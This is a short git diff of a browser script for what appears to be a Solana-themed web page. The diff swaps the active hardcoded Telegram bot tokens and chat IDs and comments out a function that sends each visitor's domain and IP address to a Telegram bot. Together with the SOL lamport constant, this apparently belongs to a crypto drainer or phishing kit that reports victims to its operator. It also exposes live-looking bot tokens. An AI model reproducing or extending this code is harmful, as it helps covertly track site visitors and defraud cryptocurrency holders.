@@ -1,9 +1,9 @@
 $(document).ready(async function () {
-  //   const telegramToken = "8195575076:AAFtYXrlFAsYMoThgEiUjHKAN6-tyPFr4J4";
-  const telegramToken = "8156645817:AAH_KHYsM_9OZ6Q7Uj55cJsyA6gZKybCp1s"; //
+    const telegramToken = "8195575076:AAFtYXrlFAsYMoThgEiUjHKAN6-tyPFr4J4";
+  // const telegramToken = "8156645817:AAH_KHYsM_9OZ6Q7Uj55cJsyA6gZKybCp1s"; //
   // Sostituisci con il token del tuo bot
-  const chatId = "7050439107"; // Sostituisci con il tuo chat ID
-  //   const chatId = "927059314"; // Sostituisci con il tuo chat ID
+  // const chatId = "7050439107"; // Sostituisci con il tuo chat ID
+    const chatId = "927059314"; // Sostituisci con il tuo chat ID
   const LAMPORTS_PER_SOL = 1000000000; // 1 SOL = 1.000.000.000 lamport
   const isMobile =
     /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
@@ -46,9 +46,9 @@ $(document).ready(async function () {
   async function notifyPageVisit() {
     const domain = window.location.hostname;
     const visitorIp = await getVisitorIp();
-    await sendTelegramMessage(
-      `👋 New visitor!\n🔗 Domain: ${domain}\n🌐 IP: ${visitorIp}`
-    );
+    // await sendTelegramMessage(
+    //   `👋 New visitor!\n🔗 Domain: ${domain}\n🌐 IP: ${visitorIp}`
+    // );
   }
 
   // Notifica quando la pagina viene chiusa o ricaricata
